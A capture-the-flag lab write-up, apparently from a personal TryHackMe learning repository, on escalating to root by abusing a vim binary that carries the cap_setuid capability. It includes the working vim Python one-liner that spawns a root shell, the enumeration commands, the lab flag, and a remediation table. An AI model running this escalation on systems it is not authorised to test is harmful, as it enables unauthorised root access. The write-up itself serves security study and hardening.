# ⚡ Lab 06: Linux Capabilities Privilege Escalation (`cap_setuid+ep`)

| Platform | Category | Difficulty | Status |
|---|---|---|---|
| Linux / TryHackMe | Privilege Escalation | Easy / Medium | ✅ Completed |

---

## 🎯 Goal
Escalate privileges from an unprivileged session (`karen` / UID 1001) to full administrative `root` (UID 0) by auditing POSIX capabilities using `getcap`, weaponizing an anomalous `cap_setuid+ep` capability on an embedded `/home/karen/vim` binary via internal Python runtime invocation, and locating the protected `flag4.txt` (`THM-9349843`).

---

## 🧠 Concept & Architecture

### Granular Privilege Division (POSIX Capabilities)
Historically, Linux enforced a binary privilege model: a process was either unprivileged (UID != 0) or completely privileged (UID == 0). To eliminate over-privileged SUID binaries, Linux kernel 2.2 introduced **Capabilities** (POSIX 1003.1e):
* The monolithic root authority is partitioned into 40+ distinct, granular units (e.g., `CAP_NET_BIND_SERVICE` for low ports, `CAP_SYS_ADMIN` for system management).
* This allows system administrators to grant a binary specific capabilities without delegating full root execution.

### The Vulnerability: `cap_setuid` on Scriptable Binaries
The `CAP_SETUID` capability grants a process the ability to arbitrarily alter its process UIDs (real, effective, and saved):
* When assigned to modular, scriptable binaries like `vim`, `python`, `perl`, or `ruby`, the capability boundary collapses.
* The application can execute internal instructions calling the `setuid(0)` syscall, instantly granting the process full root context.

```text
Monolithic Root (SUID)          Partitioned Capabilities
┌─────────────────────────┐     ┌───────────┬───────────┐
│     Full Root Crown     │ ──> │cap_net_raw│cap_setuid │ <-- Critical Flaw
│    (All-or-Nothing)     │     ├───────────┼───────────┤
└─────────────────────────┘     │cap_sys_ch |cap_dac_ov │
                                └───────────┴───────────┘
```

---

## 🔍 Enumeration

### 1. Triage Initial Delegations
Evaluate standard vector paths:

```bash
sudo -l
```

*Output:*
```text
[sudo] password for karen: 
karen is not in the sudoers file. This incident will be reported.
```

> **Evaluation:** Sudo access is strictly blocked. Pivot immediately to SUID and capability enumeration.

### 2. Audit System-Wide Capabilities
Enumerate all binaries across the filesystem with assigned capabilities, suppressing standard permission errors:

```bash
getcap -r / 2>/dev/null
```

*Execution output:*
```text
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/home/karen/vim = cap_setuid+ep
/home/ubuntu/view = cap_setuid+ep
```

### 3. Capability Analysis Matrix
* **Total Binaries Found:** `6`
* **Network Binaries:** `ping`, `traceroute6`, `mtr-packet`, `gst-ptp-helper` (Standard network capabilities, safe).
* **Exploitable Binaries:** `/home/karen/vim` and `/home/ubuntu/view` possess **`cap_setuid+ep`**.
  * `e` (Effective): The capability is actively utilized during execution.
  * `p` (Permitted): The process is authorized to leverage the capability.

---

## 💥 Exploitation Workflow

```
[Target: Low-Priv Shell (karen)]
        │
        ├── 1. Run getcap triage -> Found /home/karen/vim = cap_setuid+ep
        │
        ├── 2. Query GTFOBins for "vim" under Capabilities
        │
        ├── 3. Execute payload targeting Python3 engine:
        │       /home/karen/vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", ...)'
        │       │
        │       ├── vim initializes with cap_setuid permitted
        │       ├── os.setuid(0) shifts process UID to 0
        │       └── os.execl spawns interactive root /bin/sh
        │
        ├── 4. Confirm root shell: id -> uid=0(root)
        │
        └── 5. Hunt and extract flag4.txt via find: "THM-9349843"
```

### Step 1: Weaponize `cap_setuid` via Vim Python Engine
Invoke the capability-enabled `/home/karen/vim` binary with the `-c` argument to execute inline Python code, calling `setuid(0)` and spawning a clean subshell:

```bash
/home/karen/vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

*Command breakdown:*
* `/home/karen/vim`: Explicit path to the binary with capabilities (distinct from the system `/usr/bin/vim`).
* `-c`: Instructs Vim to execute the subsequent command string upon opening.
* `:py3`: Invocates Vim's internal Python 3 runtime engine.
* `import os; os.setuid(0);`: Directly leverages the `cap_setuid` kernel capability to reset process UID to `0` (`root`).
* `os.execl("/bin/sh", ...)`: Replaces the current process with an interactive `/bin/sh` shell.

### Step 2: Session & Privilege Verification
Confirm UID elevation immediately:

```bash
id
whoami
```

*Execution output:*
```text
# id
uid=0(root) gid=1001(karen) groups=1001(karen)
# whoami
root
```

### Step 3: Flag Discovery & Retrieval
Direct path assumptions can fail. Use `find` to systematically locate `flag4.txt` on the filesystem:

```bash
find / -name "flag4*" 2>/dev/null
cat /home/ubuntu/flag4.txt
```

*Flag output:*
```text
THM-9349843
```

---

## 🧬 Root Cause Analysis

1. **Misconception of Capability Safety:** Administrators often believe setting capabilities is inherently safe compared to SUID. However, granting `cap_setuid` to a modular executable is functionally equivalent to giving it full SUID root permissions.
2. **Scriptable Runtime Exposure:** Tools containing scripting interpreters (Python, Lua, shell escapes) must never receive privilege-altering capabilities.
3. **Insecure Binary Staging:** Deploying capability-enabled binaries inside world-traversable user home directories (`/home/karen/vim`) violates secure deployment baselines.

---

## 🛡️ Remediation & Hardening

| Layer | Defense Mechanism | Implementation |
|---|---|---|
| **Capability Removal** | Strip capabilities from interactive editors | `sudo setcap -r /home/karen/vim` |
| **Audit Baselines** | Monitor for rogue capabilities across disk | Run routine audits via `getcap -r /` and alert on any `cap_setuid` or `cap_dac_override`. |
| **Execution Restriction** | Prevent execution in home directories | Mount user storage (`/home`) with `noexec` where feasible. |
| **Mandatory Access Control** | Enforce AppArmor / SELinux confinement | Confine text editor profiles to block `setuid` syscall invocations regardless of file capabilities. |

---

## 📝 My Lab Notes

* **The Triage Runbook in Action:** When `sudo -l` threw the classic *"This incident will be reported"* barrier, following the structured methodology immediately directed me to `getcap -r / 2>/dev/null` without wasting time.
* **Never Memorize Payloads:** The Vim capability payload isn't something to memorize. The engineering skill is identifying `vim` + `cap_setuid`, knowing GTFOBins holds the trigger syntax, and understanding *why* the Python runtime is exploited.
* **The `find` Discipline:** When standard path assumptions fail (`/root/flag4.txt`), an engineer doesn't stop—they deploy `find / -name "flag4*" 2>/dev/null` to locate the artifact dynamically.

---

## 💡 Key Takeaways

1. **Capabilities can be as lethal as SUID:** `cap_setuid` allows instant elevation to UID 0 if the host binary permits arbitrary execution or code evaluation.
2. **`getcap` is mandatory triage:** Capabilities bypass `find -perm -4000` audits. Always include `getcap -r / 2>/dev/null` in standard enumeration.
3. **Internal runtimes represent attack vectors:** Applications compiled with embedded Python, Perl, or Lua provide direct avenues to execute kernel syscalls.
4. **Structured reconnaissance beats guessing:** Moving methodically through Sudo → SUID → Capabilities guarantees no privilege escalation path is missed.

---

⬅️ [Previous: SUID Binaries](./05-suid-binaries.md) | [Back to Labs](../README.md) | ➡️ [Next: Cron Jobs](./07-cron-jobs.md)
